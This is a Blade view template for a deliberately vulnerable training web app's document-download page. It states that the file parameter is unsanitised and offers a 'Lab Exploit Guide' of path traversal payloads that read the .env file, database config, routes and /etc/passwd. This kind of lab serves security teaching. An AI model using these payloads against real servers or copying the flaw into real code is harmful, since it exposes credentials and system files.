@extends('layouts.app')
@section('title', 'Download Documents')

@section('content')
<div class="mb-8">
    <h1 class="text-3xl font-bold text-gray-800">Path Traversal — Download</h1>
    <p class="text-gray-500 mt-1">Download course documents — or traverse the filesystem to read arbitrary server files.</p>
</div>

{{-- Vuln Info Banner --}}
<div class="bg-purple-50 border border-purple-300 rounded-xl p-4 mb-8 flex items-start gap-3">
    <span class="text-2xl">⚠️</span>
    <div>
        <p class="font-semibold text-purple-800">OWASP A01 — Broken Access Control (Path Traversal)</p>
        <p class="text-sm text-purple-700 mt-1">
            The <code class="bg-purple-100 px-1 rounded font-mono">?file=</code> parameter is concatenated directly onto
            <code class="bg-purple-100 px-1 rounded font-mono">storage_path('documents')</code> with <strong>no sanitization</strong>.
            Use <code class="bg-purple-100 px-1 rounded font-mono">../</code> sequences to escape the directory and read any file on the server.
        </p>
    </div>
</div>

<div class="grid grid-cols-1 lg:grid-cols-2 gap-8">

    {{-- Download Form --}}
    <div class="bg-white rounded-xl shadow p-8 border-l-4 border-purple-500">
        <h2 class="text-xl font-semibold text-gray-800 mb-6 flex items-center gap-2">
            <span>📂</span> Download File
        </h2>

        {{-- Normal documents --}}
        <div class="mb-6">
            <p class="text-xs font-semibold uppercase tracking-widest text-gray-400 mb-3">Available Documents</p>
            <ul class="space-y-2">
                <li>
                    <a href="/download/file?file=syllabus.pdf"
                       class="flex items-center gap-2 text-sm text-blue-600 hover:underline">
                        <span>📄</span> syllabus.pdf
                    </a>
                </li>
                <li>
                    <a href="/download/file?file=assignment.pdf"
                       class="flex items-center gap-2 text-sm text-blue-600 hover:underline">
                        <span>📄</span> assignment.pdf
                    </a>
                </li>
            </ul>
        </div>

        <div class="border-t border-gray-100 pt-6">
            <p class="text-xs font-semibold uppercase tracking-widest text-gray-400 mb-3">Manual File Request</p>
            <form method="GET" action="/download/file">
                <div class="mb-4">
                    <label class="block text-sm font-medium text-gray-700 mb-1">File Name</label>
                    <input type="text" name="file"
                           class="w-full border rounded-lg px-3 py-2 font-mono text-sm focus:outline-none focus:ring-2 focus:ring-purple-300"
                           placeholder="syllabus.pdf">
                    <p class="text-xs text-gray-400 mt-1">Try: <code class="bg-gray-100 px-1 rounded">../../.env</code></p>
                </div>
                <button type="submit"
                        class="w-full bg-purple-600 hover:bg-purple-700 text-white font-semibold py-2.5 rounded-lg transition">
                    Download
                </button>
            </form>
        </div>
    </div>

    {{-- Exploit Guide --}}
    <div class="bg-white rounded-xl shadow p-8 border-l-4 border-red-400">
        <h2 class="text-xl font-semibold text-gray-800 mb-5 flex items-center gap-2">
            <span>🧪</span> Lab Exploit Guide
        </h2>

        <p class="text-xs font-semibold uppercase tracking-widest text-gray-400 mb-4">Traversal Payloads</p>
        <div class="space-y-3">
            <a href="/download/file?file=../../.env" target="_blank"
               class="flex items-center justify-between bg-gray-50 hover:bg-red-50 border border-gray-200 hover:border-red-300 rounded-lg px-4 py-3 transition group">
                <div>
                    <p class="text-sm font-mono font-medium text-gray-800 group-hover:text-red-700">../../.env</p>
                    <p class="text-xs text-gray-400 mt-0.5">APP_KEY, DB credentials</p>
                </div>
                <span class="text-red-500 text-lg">→</span>
            </a>

            <a href="/download/file?file=../../config/database.php" target="_blank"
               class="flex items-center justify-between bg-gray-50 hover:bg-red-50 border border-gray-200 hover:border-red-300 rounded-lg px-4 py-3 transition group">
                <div>
                    <p class="text-sm font-mono font-medium text-gray-800 group-hover:text-red-700">../../config/database.php</p>
                    <p class="text-xs text-gray-400 mt-0.5">DB host, port, name</p>
                </div>
                <span class="text-red-500 text-lg">→</span>
            </a>

            <a href="/download/file?file=../../routes/web.php" target="_blank"
               class="flex items-center justify-between bg-gray-50 hover:bg-red-50 border border-gray-200 hover:border-red-300 rounded-lg px-4 py-3 transition group">
                <div>
                    <p class="text-sm font-mono font-medium text-gray-800 group-hover:text-red-700">../../routes/web.php</p>
                    <p class="text-xs text-gray-400 mt-0.5">All application routes</p>
                </div>
                <span class="text-red-500 text-lg">→</span>
            </a>

            <a href="/download/file?file=../../../../../etc/passwd" target="_blank"
               class="flex items-center justify-between bg-gray-50 hover:bg-red-50 border border-gray-200 hover:border-red-300 rounded-lg px-4 py-3 transition group">
                <div>
                    <p class="text-sm font-mono font-medium text-gray-800 group-hover:text-red-700">../../../../../etc/passwd</p>
                    <p class="text-xs text-gray-400 mt-0.5">OS user list (Linux)</p>
                </div>
                <span class="text-red-500 text-lg">→</span>
            </a>
        </div>
    </div>

</div>
@endsection
